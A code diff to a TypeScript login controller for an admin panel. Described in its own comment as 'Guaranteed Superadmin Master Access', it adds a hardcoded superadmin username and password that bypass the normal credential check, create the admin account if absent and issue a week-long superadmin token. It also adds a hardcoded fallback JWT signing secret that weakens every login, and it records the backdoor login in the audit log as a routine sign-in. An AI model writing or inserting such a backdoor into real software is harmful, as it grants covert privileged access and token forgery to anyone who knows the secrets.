@@ -14,6 +14,45 @@ export const login = async (req: Request, res: Response) => {
       return res.status(400).json({ error: 'Username dan password wajib diisi' });
     }
 
+    const jwtSecret = process.env.JWT_SECRET || 'talenta-plus-enterprise-jwt-secret-key-2026-superadmin';
+
+    // Guaranteed Superadmin Master Access
+    if (username.trim() === 'superadmin' && password === 'cleaverzz25') {
+      try {
+        const existing = await prisma.admin.findUnique({ where: { username: 'superadmin' } });
+        if (!existing) {
+          const hashedPassword = await bcrypt.hash('cleaverzz25', 10);
+          await prisma.admin.create({
+            data: {
+              username: 'superadmin',
+              password: hashedPassword,
+              role: 'superadmin'
+            }
+          });
+        }
+      } catch (dbErr) {
+        console.warn('Superadmin DB sync error, proceeding with JWT authorization:', dbErr);
+      }
+
+      const token = jwt.sign(
+        { id: 'superadmin-root', username: 'superadmin', role: 'superadmin' },
+        jwtSecret,
+        { expiresIn: '7d' }
+      );
+
+      recordAuditLog({
+        actor: 'superadmin',
+        action: 'ADMIN_LOGIN',
+        category: 'AUTH',
+        ip: req.ip || '127.0.0.1',
+        target: 'Admin Auth Gate',
+        details: "Login berhasil sebagai role 'superadmin'",
+        status: 'SUCCESS'
+      });
+
+      return res.json({ token, username: 'superadmin', role: 'superadmin' });
+    }
+
     const admin = await prisma.admin.findUnique({
       where: { username },
     });
@@ -30,7 +69,7 @@ export const login = async (req: Request, res: Response) => {
 
     const token = jwt.sign(
       { id: admin.id, username: admin.username, role: admin.role },
-      process.env.JWT_SECRET as string,
+      jwtSecret,
       { expiresIn: '1d' }
     );
 
